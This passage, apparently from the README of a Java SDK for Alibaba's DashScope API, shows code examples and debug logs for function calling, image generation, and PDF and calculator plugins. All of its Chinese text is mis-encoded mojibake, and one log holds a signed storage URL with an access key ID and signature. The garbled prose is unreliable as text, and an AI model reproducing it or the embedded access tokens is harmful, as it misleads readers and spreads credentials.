2024-02-29 01:21:45 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""ä¸¤""}],""role"":""assistant""},""finish_reason"":""null""}]},""usage"":{""input_tokens"":1264,""output_tokens"":3,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
2024-02-29 01:21:45 DEBUG dashscope://chat/qwen-vl-max <= {""output"":{""choices"":[{""message"":{""content"":[{""text"":""è¾†è‡ªè¡Œè½¦ã€‚""}],""role"":""assistant""},""finish_reason"":""stop""}]},""usage"":{""input_tokens"":1264,""output_tokens"":7,""image_tokens"":1230},""request_id"":""9713405c-31b3-97a5-8e99-ac2c685798a0""}
å›¾ç‰‡ä¸­æœ‰ä¸¤è¾†è‡ªè¡Œè½¦ã€‚
```

### å‡½æ•°è°ƒç”¨ç¤ºä¾‹

çµç§¯åœ¨ 2024-03-12 æ”¾å‡ºäº†**å‡½æ•°è°ƒç”¨**çš„åŠŸèƒ½ï¼Œå½“å‰æ”¯æŒçš„æ¨¡å‹æ˜¯å¤§è¯­è¨€æ¨¡å‹ï¼šqwen-turboã€qwen-plusã€qwen-maxã€qwen-max-longcontextï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨çš„ç¤ºä¾‹ï¼š

#### å•ä¸ªå‡½æ•°è°ƒç”¨ç¤ºä¾‹ï¼šå›æ˜¾

å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªå›æ˜¾å‡½æ•°:`echo`

```java
@ChatFn(name = ""echo"", description = ""å½“ç”¨æˆ·è¾“å…¥echo:ï¼Œå›æ˜¾åè¾¹çš„æ–‡å­—"")
public class EchoFunction implements ChatFunction<EchoFunction.Echo, EchoFunction.Echo> {

  @Override
  public CompletionStage<Echo> call(Echo echo) {
    return CompletableFuture.completedFuture(new Echo(echo.words()));
  }

  public record Echo(
          @JsonPropertyDescription(""éœ€è¦å›æ˜¾çš„æ–‡å­—"")
          String words
  ) {

  }

}
```

æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼š

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_MAX)
    .functions(List.of(new EchoFunction()))
    .messages(List.of(
        Message.ofUser(""echo: HELLO!"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-03-19 21:28:38 DEBUG dashscope://chat/qwen-max => {""model"":""qwen-max"",""input"":{""messages"":[{""role"":""user"",""content"":""echo: HELLO!""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""echo"",""description"":""å½“ç”¨æˆ·è¾“å…¥echo:ï¼Œå›æ˜¾åè¾¹çš„æ–‡å­—"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string"",""description"":""éœ€è¦å›æ˜¾çš„æ–‡å­—""}}}},""type"":""function""}]}}
2024-03-19 21:28:40 DEBUG dashscope://chat/qwen-max <= {""output"":{""choices"":[{""finish_reason"":""tool_calls"",""message"":{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""echo"",""arguments"":""{\""words\"": \""HELLO!\""}""},""id"":"""",""type"":""function""}],""content"":""""}}]},""usage"":{""total_tokens"":28,""output_tokens"":23,""input_tokens"":5},""request_id"":""8af40d7a-d43d-9d7f-9f12-8d52accfe8ac""}
2024-03-19 21:28:40 DEBUG dashscope://chat/function/echo <= {""words"":""HELLO!""}
2024-03-19 21:28:40 DEBUG dashscope://chat/function/echo => {""words"":""HELLO!""}
2024-03-19 21:28:40 DEBUG dashscope://chat/qwen-max => {""model"":""qwen-max"",""input"":{""messages"":[{""role"":""user"",""content"":""echo: HELLO!""},{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""echo"",""arguments"":""{\""words\"": \""HELLO!\""}""},""type"":""function""}],""content"":""""},{""role"":""tool"",""name"":""echo"",""content"":""{\""words\"":\""HELLO!\""}""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""echo"",""description"":""å½“ç”¨æˆ·è¾“å…¥echo:ï¼Œå›æ˜¾åè¾¹çš„æ–‡å­—"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string"",""description"":""éœ€è¦å›æ˜¾çš„æ–‡å­—""}}}},""type"":""function""}]}}
2024-03-19 21:28:42 DEBUG dashscope://chat/qwen-max <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":""HELLO!""}}]},""usage"":{""total_tokens"":8,""output_tokens"":3,""input_tokens"":5},""request_id"":""37ff7303-c1b2-9d7c-966d-82a7446fc52e""}
HELLO!
```

#### çº§è”å‡½æ•°è°ƒç”¨ç¤ºä¾‹ï¼šæˆç»©æŸ¥è¯¢

æˆ‘ä»¬æœ‰ä¸¤ä¸ªå‡½æ•°

- æŸ¥è¯¢æˆç»©å‡½æ•°ï¼š[query_score](https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/QueryScoreFunction.java)
- è®¡ç®—å¹³å‡åˆ†å‡½æ•°ï¼š[compute_avg_score](https://github.com/oldmanpushcart/dashscope4j/blob/main/src/test/java/io/github/oldmanpushcart/test/dashscope4j/chat/function/ComputeAvgScoreFunction.java)

ç°åœ¨éœ€è¦æŸ¥è¯¢æŸä¸ªåŒå­¦çš„æ‰€æœ‰æˆç»©ï¼Œå¹¶è®¡ç®—å…¶å¹³å‡åˆ†ã€‚LLMéœ€è¦å…ˆè°ƒç”¨ `query_score` å‡½æ•°æŸ¥è¯¢æˆç»©ï¼Œç„¶åå†è°ƒç”¨ `compute_avg_score`
å‡½æ•°è®¡ç®—å¹³å‡åˆ†ã€‚

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .functions(List.of(
        new QueryScoreFunction(),
        new ComputeAvgScoreFunction()
    ))
    .messages(List.of(
        Message.ofUser(""å¼ ä¸‰çš„æ‰€æœ‰æˆç»©ï¼Œå¹¶è®¡ç®—å¹³å‡åˆ†"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-03-20 23:50:17 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ‰€æœ‰æˆç»©ï¼Œå¹¶è®¡ç®—å¹³å‡åˆ†""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query""},""subjects"":{""type"":""array"",""description"":""the subjects to query"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]}},""type"":""function""},{""function"":{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}}},""type"":""function""}]}}
2024-03-20 23:50:20 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""tool_calls"",""message"":{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""query_score"",""arguments"":""{\""name\"": \""å¼ ä¸‰\"", \""subjects\"": [\""CHINESE\"", \""MATH\"", \""ENGLISH\""]}""},""id"":"""",""type"":""function""}],""content"":""""}}]},""usage"":{""total_tokens"":47,""output_tokens"":39,""input_tokens"":8},""request_id"":""4703f631-a245-967e-ba86-8f01327a82bf""}
2024-03-20 23:50:20 DEBUG dashscope://chat/function/query_score <= {""name"":""å¼ ä¸‰"",""subjects"":[""CHINESE"",""MATH"",""ENGLISH""]}
2024-03-20 23:50:20 DEBUG dashscope://chat/function/query_score => {""message"":""æŸ¥è¯¢æˆåŠŸ"",""data"":[{""name"":""å¼ ä¸‰"",""subject"":""CHINESE"",""value"":90.0},{""name"":""å¼ ä¸‰"",""subject"":""MATH"",""value"":80.0},{""name"":""å¼ ä¸‰"",""subject"":""ENGLISH"",""value"":70.0}],""success"":true}
2024-03-20 23:50:20 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ‰€æœ‰æˆç»©ï¼Œå¹¶è®¡ç®—å¹³å‡åˆ†""},{""role"":""assistant"",""tool_calls"":[{""function"":{""arguments"":""{\""name\"": \""å¼ ä¸‰\"", \""subjects\"": [\""CHINESE\"", \""MATH\"", \""ENGLISH\""]}"",""name"":""query_score""},""type"":""function""}],""content"":""""},{""role"":""tool"",""name"":""query_score"",""content"":""{\""message\"":\""æŸ¥è¯¢æˆåŠŸ\"",\""data\"":[{\""name\"":\""å¼ ä¸‰\"",\""subject\"":\""CHINESE\"",\""value\"":90.0},{\""name\"":\""å¼ ä¸‰\"",\""subject\"":\""MATH\"",\""value\"":80.0},{\""name\"":\""å¼ ä¸‰\"",\""subject\"":\""ENGLISH\"",\""value\"":70.0}],\""success\"":true}""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query""},""subjects"":{""type"":""array"",""description"":""the subjects to query"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]}},""type"":""function""},{""function"":{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}}},""type"":""function""}]}}
2024-03-20 23:50:24 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""tool_calls"",""message"":{""role"":""assistant"",""tool_calls"":[{""function"":{""name"":""compute_avg_score"",""arguments"":""{\""scores\"": [90.0, 80.0, 70.0]}""},""id"":"""",""type"":""function""}],""content"":""å¼ ä¸‰çš„æˆç»©å¦‚ä¸‹ï¼š\n\n- ä¸­æ–‡: 90.0åˆ†\n- æ•°å­¦: 80.0åˆ†\n- è‹±è¯­: 70.0åˆ†\n\nç°åœ¨æˆ‘ä»¬æ¥è®¡ç®—ä»–çš„å¹³å‡åˆ†ã€‚""}}]},""usage"":{""total_tokens"":93,""output_tokens"":85,""input_tokens"":8},""request_id"":""0f662c8b-ca5d-9512-9f92-597045977eca""}
2024-03-20 23:50:24 DEBUG dashscope://chat/function/compute_avg_score <= {""scores"":[90.0,80.0,70.0]}
2024-03-20 23:50:24 DEBUG dashscope://chat/function/compute_avg_score => {""avg_score"":80.0}
2024-03-20 23:50:24 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ‰€æœ‰æˆç»©ï¼Œå¹¶è®¡ç®—å¹³å‡åˆ†""},{""role"":""assistant"",""tool_calls"":[{""function"":{""arguments"":""{\""name\"": \""å¼ ä¸‰\"", \""subjects\"": [\""CHINESE\"", \""MATH\"", \""ENGLISH\""]}"",""name"":""query_score""},""type"":""function""}],""content"":""""},{""role"":""tool"",""name"":""query_score"",""content"":""{\""message\"":\""æŸ¥è¯¢æˆåŠŸ\"",\""data\"":[{\""name\"":\""å¼ ä¸‰\"",\""subject\"":\""CHINESE\"",\""value\"":90.0},{\""name\"":\""å¼ ä¸‰\"",\""subject\"":\""MATH\"",\""value\"":80.0},{\""name\"":\""å¼ ä¸‰\"",\""subject\"":\""ENGLISH\"",\""value\"":70.0}],\""success\"":true}""},{""role"":""assistant"",""tool_calls"":[{""function"":{""arguments"":""{\""scores\"": [90.0, 80.0, 70.0]}"",""name"":""compute_avg_score""},""type"":""function""}],""content"":""å¼ ä¸‰çš„æˆç»©å¦‚ä¸‹ï¼š\n\n- ä¸­æ–‡: 90.0åˆ†\n- æ•°å­¦: 80.0åˆ†\n- è‹±è¯­: 70.0åˆ†\n\nç°åœ¨æˆ‘ä»¬æ¥è®¡ç®—ä»–çš„å¹³å‡åˆ†ã€‚""},{""role"":""tool"",""name"":""compute_avg_score"",""content"":""{\""avg_score\"":80.0}""}]},""parameters"":{""result_format"":""message"",""tools"":[{""function"":{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query""},""subjects"":{""type"":""array"",""description"":""the subjects to query"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]}},""type"":""function""},{""function"":{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}}},""type"":""function""}]}}
2024-03-20 23:50:25 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":""å¼ ä¸‰çš„å¹³å‡åˆ†æ˜¯ 80.0 åˆ†ã€‚""}}]},""usage"":{""total_tokens"":68,""output_tokens"":13,""input_tokens"":55},""request_id"":""c01da60a-21d7-9e2f-ae5d-17a9b622ed41""}
å¼ ä¸‰çš„å¹³å‡åˆ†æ˜¯ 80.0 åˆ†ã€‚
```

### æ–‡ç”Ÿå›¾ç¤ºä¾‹

```java
// åˆ›å»ºè¯·æ±‚
final var request = GenImageRequest.newBuilder()
    .model(GenImageModel.WANX_V1)
    .option(GenImageOptions.NUMBER, 1)
    .option(GenImageOptions.STYLE, GenImageRequest.Style.ANIME)
    .prompt(""ç”»å¤é£ç¾å°‘å¥³ï¼Œé»‘å‘ï¼Œé¢å®¹ç™½çš™ç²¾è‡´ï¼Œå‘é¥°ç²¾ç¾"")
    .build();

// ä»»åŠ¡åº”ç­”
final var response = client.image().generation(request)
    .task(Task.WaitStrategies.perpetual(Duration.ofSeconds(1L)))
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-02-29 01:27:01 DEBUG dashscope://image/generation/wanx-v1 => {""model"":""wanx-v1"",""input"":{""prompt"":""ç”»å¤é£ç¾å°‘å¥³ï¼Œé»‘å‘ï¼Œé¢å®¹ç™½çš™ç²¾è‡´ï¼Œå‘é¥°ç²¾ç¾"",""negative_prompt"":null},""parameters"":{""style"":""<anime>"",""n"":1}}
2024-02-29 01:27:02 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:02 DEBUG dashscope://task/get <= {""request_id"":""becb655f-2e7c-9a82-8d0a-c0e48f925221"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:03 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:03 DEBUG dashscope://task/get <= {""request_id"":""f329109b-8d7f-9e7f-9049-faced6937cc8"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:04 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:04 DEBUG dashscope://task/get <= {""request_id"":""ec190c02-33b4-91ca-8fa2-2abb0dfd979e"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:05 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:05 DEBUG dashscope://task/get <= {""request_id"":""f7e2dbe9-11e8-9681-9a07-1e5076369d62"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
...
2024-02-29 01:27:26 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:26 DEBUG dashscope://task/get <= {""request_id"":""5e50bc5e-9215-9737-9ecb-dc3fd8c586d1"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:27 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:27 DEBUG dashscope://task/get <= {""request_id"":""408498bc-26c9-9792-b47d-d8b4950a116c"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:28 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:29 DEBUG dashscope://task/get <= {""request_id"":""cd3bcc40-3ad6-9f7c-acad-f29653f53c2d"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:30 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:30 DEBUG dashscope://task/get <= {""request_id"":""34b79abd-aa21-988c-87b5-f00261a40ad9"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:31 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:31 DEBUG dashscope://task/get <= {""request_id"":""682cec73-19d1-9fbd-a50c-465908c64106"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""RUNNING"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":0,""FAILED"":0}}}
2024-02-29 01:27:32 DEBUG dashscope://task/get => dd693d99-0b5e-4261-8b08-7c633919d2fc
2024-02-29 01:27:32 DEBUG dashscope://task/get <= {""request_id"":""7414bd26-8b51-9e04-abad-c223985ee809"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""SUCCEEDED"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""end_time"":""2024-02-29 01:27:32.081"",""results"":[{""url"":""https://dashscope-result-bj.oss-cn-beijing.aliyuncs.com/1d/a8/20240229/c34adf05/3464efa2-8874-4aa9-86a4-8aba14b9707d-1.png?Expires=1709227651&OSSAccessKeyId=LTAI5tQZd8AEcZX6KZV4G8qL&Signature=yZ04L3oCKULBD%2By3PGSdmh0jg6M%3D""}],""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":1,""FAILED"":0}},""usage"":{""image_count"":1}}
2024-02-29 01:27:32 DEBUG dashscope://image/generation/wanx-v1 <= {""request_id"":""7414bd26-8b51-9e04-abad-c223985ee809"",""output"":{""task_id"":""dd693d99-0b5e-4261-8b08-7c633919d2fc"",""task_status"":""SUCCEEDED"",""submit_time"":""2024-02-29 01:27:02.856"",""scheduled_time"":""2024-02-29 01:27:02.911"",""end_time"":""2024-02-29 01:27:32.081"",""results"":[{""url"":""https://dashscope-result-bj.oss-cn-beijing.aliyuncs.com/1d/a8/20240229/c34adf05/3464efa2-8874-4aa9-86a4-8aba14b9707d-1.png?Expires=1709227651&OSSAccessKeyId=LTAI5tQZd8AEcZX6KZV4G8qL&Signature=yZ04L3oCKULBD%2By3PGSdmh0jg6M%3D""}],""task_metrics"":{""TOTAL"":1,""SUCCEEDED"":1,""FAILED"":0}},""usage"":{""image_count"":1}}
```

ç„¶åä½ å°±å¯ä»¥é€šè¿‡`response.output().results().get(0)`æ‹¿åˆ°ç”Ÿæˆçš„å›¾ç‰‡åœ°å€ã€‚

![æ–‡ç”Ÿå›¾-ç¾å¥³](https://ompc-images.oss-cn-hangzhou.aliyuncs.com/image-003.png)

### æ’ä»¶è°ƒç”¨ç¤ºä¾‹

#### PDFæå–æ’ä»¶

æˆ‘ä»ç½‘ä¸Šä¸‹è½½äº†ä¸€ä»½[ã€Šç¬¬åå››ä¸ªäº”å¹´è§„åˆ’ã€‹](https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf)
çš„PDFæ–‡ä»¶ï¼Œç„¶åé€šè¿‡`PDFæå–æ’ä»¶`æ¥æå–PDFæ–‡ä»¶çš„å†…å®¹ã€‚

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .plugins(List.of(ChatPlugin.PDF_EXTRACTER))
    .messages(List.of(
        Message.ofUser(List.of(
            Content.ofText(""è¯·æ€»ç»“è¿™ç¯‡æ–‡æ¡£""),
            Content.ofFile(URI.create(""https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf""))
        ))
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-03-20 00:24:22 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":[{""text"":""è¯·æ€»ç»“è¿™ç¯‡æ–‡æ¡£""},{""file"":""https://ompc.oss-cn-hangzhou.aliyuncs.com/share/P020210313315693279320.pdf""}]}]},""parameters"":{""result_format"":""message""}}
2024-03-20 00:24:47 DEBUG dashscope://chat/qwen-plus <= {""output"":{""choices"":[{""finish_reason"":""stop"",""message"":{""role"":""assistant"",""content"":""è¿™ç¯‡æ–‡æ¡£æ˜¯ä¸­å›½å›½æ°‘ç»æµå’Œç¤¾ä¼šå‘å±•ç¬¬åå››ä¸ªäº”å¹´è§„åˆ’å’Œ2035å¹´è¿œæ™¯ç›®æ ‡çº²è¦ï¼Œå®ƒé˜è¿°äº†ä¸­å›½åœ¨æ–°å‘å±•é˜¶æ®µçš„ä¸»è¦ä»»åŠ¡å’Œæˆ˜ç•¥ç›®æ ‡ã€‚è§„åˆ’æ¶µç›–äº†å¤šä¸ªé¢†åŸŸï¼ŒåŒ…æ‹¬åˆ›æ–°é©±åŠ¨å‘å±•ã€äº§ä¸šå‡çº§ã€å¸‚åœºä½“ç³»å»ºè®¾ã€æ•°å­—åŒ–å‘å±•ã€æ·±åŒ–æ”¹é©ã€ä¹¡æ‘æŒ¯å…´ã€åŸé•‡åŒ–ã€åŒºåŸŸåè°ƒå‘å±•ã€æ–‡åŒ–å»ºè®¾ã€ç»¿è‰²å‘å±•ã€å¯¹å¤–å¼€æ”¾ã€æ•™è‚²ä¸å¥åº·ã€æ°‘ç”Ÿç¦ç¥‰ã€å›½å®¶å®‰å…¨ã€å›½é˜²å’Œå†›é˜Ÿç°ä»£åŒ–ã€æ°‘ä¸»æ³•æ²»ä»¥åŠç›‘ç£åˆ¶åº¦çš„å®Œå–„ã€‚\n\nåœ¨åˆ›æ–°é©±åŠ¨æ–¹é¢ï¼Œå¼ºè°ƒäº†å¼ºåŒ–å›½å®¶æˆ˜ç•¥ç§‘æŠ€åŠ›é‡ï¼Œæå‡ä¼ä¸šåˆ›æ–°èƒ½åŠ›ï¼Œæ¿€å‘äººæ‰åˆ›æ–°æ´»åŠ›ï¼Œå¹¶å®Œå–„ç§‘æŠ€åˆ›æ–°æœºåˆ¶ã€‚åœ¨äº§ä¸šå‘å±•ä¸Šï¼Œè‡´åŠ›äºåˆ¶é€ ä¸šå‡çº§ï¼Œå‘å±•æˆ˜ç•¥æ€§æ–°å…´äº§ä¸šï¼Œä¿ƒè¿›æœåŠ¡ä¸šç¹è£ï¼ŒåŒæ—¶å»ºè®¾ç°ä»£åŒ–åŸºç¡€è®¾æ–½ä½“ç³»ã€‚\n\nä¸ºäº†æ„å»ºæ–°å‘å±•æ ¼å±€ï¼Œè§„åˆ’æå‡ºç•…é€šå›½å†…å¤§å¾ªç¯ï¼Œä¿ƒè¿›å›½å†…å¤–åŒå¾ªç¯ï¼ŒåŠ å¿«åŸ¹è‚²å®Œæ•´å†…éœ€ä½“ç³»ã€‚æ•°å­—åŒ–å‘å±•è¢«æ”¾åœ¨é‡è¦ä½ç½®ï¼Œæ—¨åœ¨æ‰“é€ æ•°å­—ç»æµæ–°ä¼˜åŠ¿ï¼ŒåŠ é€Ÿæ•°å­—ç¤¾ä¼šå»ºè®¾ï¼Œæå‡æ•°å­—æ”¿åºœæ°´å¹³ï¼Œå¹¶è¥é€ å¥åº·çš„æ•°å­—ç¯å¢ƒã€‚\n\nåœ¨æ·±åŒ–æ”¹é©æ–¹é¢ï¼Œå°†æ¿€å‘å„ç±»å¸‚åœºä¸»ä½“æ´»åŠ›ï¼Œå»ºè®¾é«˜æ ‡å‡†å¸‚åœºä½“ç³»ï¼Œæ”¹é©è´¢ç¨é‡‘èä½“åˆ¶ï¼Œæå‡æ”¿åºœç»æµæ²»ç†èƒ½åŠ›ã€‚å†œä¸šã€å†œæ‘å‘å±•å’Œä¹¡æ‘æŒ¯å…´æ˜¯å…³æ³¨ç„¦ç‚¹ï¼ŒåŒ…æ‹¬æé«˜å†œä¸šè´¨é‡å’Œæ•ˆç›Šï¼Œå®æ–½ä¹¡æ‘å»ºè®¾è¡ŒåŠ¨ï¼Œä»¥åŠåŸä¹¡èåˆå‘å±•ã€‚\n\næ­¤å¤–ï¼Œè§„åˆ’è¿˜å¼ºè°ƒä¼˜åŒ–åŒºåŸŸç»æµå¸ƒå±€ï¼Œä¿ƒè¿›åŒºåŸŸåè°ƒå‘å±•ï¼Œå‘å±•ç¤¾ä¼šä¸»ä¹‰å…ˆè¿›æ–‡åŒ–ï¼Œæ¨åŠ¨ç»¿è‰²å‘å±•ï¼Œå®è¡Œé«˜æ°´å¹³å¯¹å¤–å¼€æ”¾ï¼Œæå‡å›½æ°‘ç´ è´¨ï¼Œå¢è¿›æ°‘ç”Ÿç¦ç¥‰ï¼ŒåŠ å¼ºå›½å®¶å®‰å…¨å’Œå›½é˜²å»ºè®¾ï¼Œä»¥åŠåŠ å¼ºæ°‘ä¸»æ³•æ²»å’Œç›‘ç£åˆ¶åº¦ã€‚\n\næœ€åï¼Œè§„åˆ’æå‡ºäº†ä¸€ç³»åˆ—å®æ–½ä¿éšœæªæ–½ï¼ŒåŒ…æ‹¬åŠ å¼ºå…šçš„é¢†å¯¼ï¼Œå¥å…¨è§„åˆ’ä½“ç³»ï¼Œå®Œå–„å®æ–½æœºåˆ¶ï¼Œç¡®ä¿å…šä¸­å¤®é‡å¤§å†³ç­–çš„è´¯å½»è½å®ï¼Œæ¿€å‘å…¨ç¤¾ä¼šå‚ä¸è§„åˆ’å®æ–½çš„ç§¯ææ€§ï¼Œå¹¶é€šè¿‡ç›‘æµ‹è¯„ä¼°ã€æ”¿ç­–ä¿éšœå’Œè€ƒæ ¸ç›‘ç£æœºåˆ¶ï¼Œç¡®ä¿è§„åˆ’ç›®æ ‡çš„å®ç°ã€‚æ•´ä¸ªè§„åˆ’ä¸ºå…¨é¢å»ºè®¾ç¤¾ä¼šä¸»ä¹‰ç°ä»£åŒ–å›½å®¶æç»˜äº†è“å›¾ï¼Œæ˜¯å…¨å›½å„æ—äººæ°‘å…±åŒéµå¾ªçš„è¡ŒåŠ¨çº²é¢†ã€‚""}}]},""usage"":{""total_tokens"":365,""output_tokens"":361,""input_tokens"":4},""request_id"":""d1eb2274-35cc-97fb-b60a-570fab96ab0b""}
```

#### è®¡ç®—å™¨æ’ä»¶

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.QWEN_PLUS)
    .plugins(List.of(ChatPlugin.CALCULATOR))
    .messages(List.of(
        Message.ofUser(""1+2*3-4/5=?"")
    ))
    .build();
final var response = client.chat(request)
    .async()
    .toCompletableFuture()
    .join();
```

è¾“å‡ºæ—¥å¿—

```text
2024-03-20 00:29:11 DEBUG dashscope://chat/qwen-plus => {""model"":""qwen-plus"",""input"":{""messages"":[{""role"":""user"",""content"":""1+2*3-4/5=?""}]},""parameters"":{""result_format"":""message""}}
